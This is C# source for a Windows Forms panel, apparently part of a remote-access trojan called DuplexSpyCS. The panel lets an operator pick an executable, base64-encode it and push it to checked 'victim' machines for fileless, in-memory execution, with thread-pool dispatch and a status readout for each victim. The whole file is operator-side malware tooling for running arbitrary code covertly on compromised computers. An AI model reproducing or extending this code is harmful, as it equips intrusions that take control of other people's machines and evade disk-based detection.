using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFilelessExec : Form
    {
        public List<clsVictim> m_lsVictim;

        private bool m_bSignalPause { get; set; }
        private bool m_bSignalStop { get; set; }

        public frmFilelessExec(List<clsVictim> lsVictim)
        {
            InitializeComponent();

            m_lsVictim = lsVictim;

            m_bSignalPause = false;
            m_bSignalStop = false;
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!m_lsVictim.Contains(victim))
                return;

            if (lsMsg[0] == "fle") //Fileless Execution
            {
                int nCode = int.Parse(lsMsg[1]);
                string szMsg = lsMsg[2];

                Invoke(new Action(() =>
                {
                    ListViewItem item = listView1.FindItemWithText(victim.ID, true, 0);

                    if (nCode == 0)
                    {
                        richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
                        
                        if (item == null)
                            return;

                        item.SubItems[1].Text = "Failed";
                    }
                    else
                    {
                        richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] OK");
                        
                        if (item == null)
                            return;

                        item.SubItems[1].Text = "OK";
                    }
                }));
            }
        }

        void fnSendPayload(string[] alpArgs, int nThdCnt, byte[] abData)
        {
            List<clsVictim> lsTarget = new List<clsVictim>();
            Invoke(new Action(() =>
            {
                lsTarget.AddRange(
                    listView1.CheckedItems.Cast<ListViewItem>()
                    .Where(x => x.Checked)
                    .Select(x => (clsVictim)x.Tag)
                    .ToList()
                    );
                toolStripStatusLabel2.Text = "Running";

                listView1.CheckedItems.Cast<ListViewItem>().ToList().ForEach(x => x.SubItems[1].Text = "?");
            }));

            string szArgs = string.Join(",", alpArgs.Select(x => clsCrypto.b64E2Str(x)).ToArray());
            string szData = Convert.ToBase64String(abData);

            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(nThdCnt, nThdCnt);
            foreach (clsVictim v in lsTarget)
            {
                while (m_bSignalPause)
                {
                    Invoke(new Action(() => toolStripStatusLabel2.Text = "Pause"));
                    Thread.Sleep(1000);
                }

                if (m_bSignalStop)
                {
                    Invoke(new Action(() => toolStripStatusLabel2.Text = "Stopped"));
                    break;
                }

                //ThreadPool.QueueUserWorkItem(x => v.SendCommand($"fle|{szArgs}|{szData}"));
                if (radioButton1.Checked)
                {
                    ThreadPool.QueueUserWorkItem(x => v.fnSendCommand(new string[]
                    {
                        "fle",
                        "x64",
                        string.Empty,
                        szData
                    }));
                }
                else if (radioButton2.Checked)
                {
                    ThreadPool.QueueUserWorkItem(x => v.fnSendCommand(new string[]
                    {
                        "fle",
                        "cs",
                        szArgs,
                        szData,
                    }));
                }
            }
        }

        void fnSetup()
        {
            //Controls
            listView1.FullRowSelect = true;
            listView1.CheckBoxes = true;
            
            toolStripStatusLabel1.Text = $"Target[{m_lsVictim.Count}]";
            toolStripStatusLabel2.Text = string.Empty;

            radioButton1.Checked = true;

            numericUpDown1.Value = 1;
            numericUpDown1.Minimum = 1;
            numericUpDown1.Maximum = 100;

            //setup
            foreach (clsVictim v in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(v.ID);
                item.SubItems.Add("?");
                item.Tag = v;

                listView1.Items.Add(item);
            }
        }

        private void frmFilelessExec_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Open exe.
        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Executable (*.exe)|*.exe";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }
        //Check all.
        private void button2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck all.
        private void button3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }
        //Go
        private void button4_Click(object sender, EventArgs e)
        {
            string szFileName = textBox1.Text;
            string szArgs = textBox2.Text;

            if (!File.Exists(szFileName))
            {
                MessageBox.Show("File not found: " + szFileName, "FileNotExists", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int nThdCnt = (int)numericUpDown1.Value;
            string[] alpArgs = szArgs.Split(' ');
            byte[] abData = File.ReadAllBytes(szFileName);

            new Thread(() => fnSendPayload(alpArgs, nThdCnt, abData)).Start();
        }
        //Pause
        private void button6_Click(object sender, EventArgs e)
        {
            if (button6.Text == "Pause")
            {
                m_bSignalPause = false;
                toolStripStatusLabel2.Text = "Running";
                button6.Text = "Resume";
            }
            else
            {
                m_bSignalPause = true;
                toolStripStatusLabel2.Text = "Pause";
                button6.Text = "Pause";
            }
        }
        //Stop
        private void button5_Click(object sender, EventArgs e)
        {
            m_bSignalStop = true;
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            textBox2.Enabled = !radioButton1.Checked;
        }
    }
}
